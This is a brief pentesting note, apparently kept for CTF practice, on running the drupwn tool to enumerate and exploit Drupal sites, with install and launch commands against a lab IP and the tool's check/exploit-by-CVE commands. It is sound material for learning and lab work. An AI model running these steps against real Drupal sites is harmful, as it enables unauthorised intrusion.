#### For drupal exploitation/enumeration
Github:
[drupwn](https://github.com/immunIT/drupwn)

In order to make this exploit working first run the python setup.py script:

```python
python setup.py install
```

Then run the enumeration/exploitation binary with this command:

```shell
./drupwn --target http://10.0.160.196 --mode <exploit/enum>
```

Finally use the wizard instructions:

```shell
Commands available: list | quit | check [CVE_NUMBER] | exploit [CVE_NUMBER]
```

Example:
[ECHO CTF tweek](https://echoctf.red/target/24/writeup/read/13)
